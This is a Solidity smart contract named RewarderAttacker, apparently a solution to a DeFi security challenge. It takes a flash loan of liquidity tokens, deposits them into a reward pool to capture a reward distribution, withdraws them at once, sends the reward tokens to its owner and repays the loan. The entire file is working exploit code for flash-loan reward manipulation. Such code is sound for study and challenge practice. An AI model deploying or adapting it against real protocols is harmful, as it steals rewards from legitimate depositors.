
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// import "solady/src/utils/FixedPointMathLib.sol";
// import "solady/src/utils/SafeTransferLib.sol";
// import { RewardToken } from "./RewardToken.sol";
// import { AccountingToken } from "./AccountingToken.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IFlashLoanPool {
  function flashLoan(uint256 amount) external;
}

interface IRewarder {
  function deposit(uint256 amount) external;
  function withdraw(uint256 amount) external;
  function rewardToken() external returns(IERC20);
}

contract RewarderAttacker {
  address immutable _owner;
  IFlashLoanPool immutable _flashLoanPool;
  IRewarder immutable _rewarder;
  IERC20 immutable _liquidityToken;

  constructor(address flashLoanPool, address rewarder, address liquidityToken) {
    _owner = msg.sender;
    _flashLoanPool = IFlashLoanPool(flashLoanPool);
    _rewarder = IRewarder(rewarder);
    _liquidityToken = IERC20(liquidityToken);
  }

  function attack(uint256 amount) public {
    require(msg.sender == _owner, "only owner");
    _flashLoanPool.flashLoan(amount);
  }

  function receiveFlashLoan(uint256 amount) external {
    require(msg.sender == address(_flashLoanPool), "Only flash loan pool can call");

    _liquidityToken.approve(address(_rewarder), amount);
    _rewarder.deposit(amount);

    _rewarder.withdraw(amount);
    uint256 rewards = _rewarder.rewardToken().balanceOf(address(this));
    _rewarder.rewardToken().transfer(_owner, rewards);
    
    _liquidityToken.transfer(address(_flashLoanPool), amount);
  }
}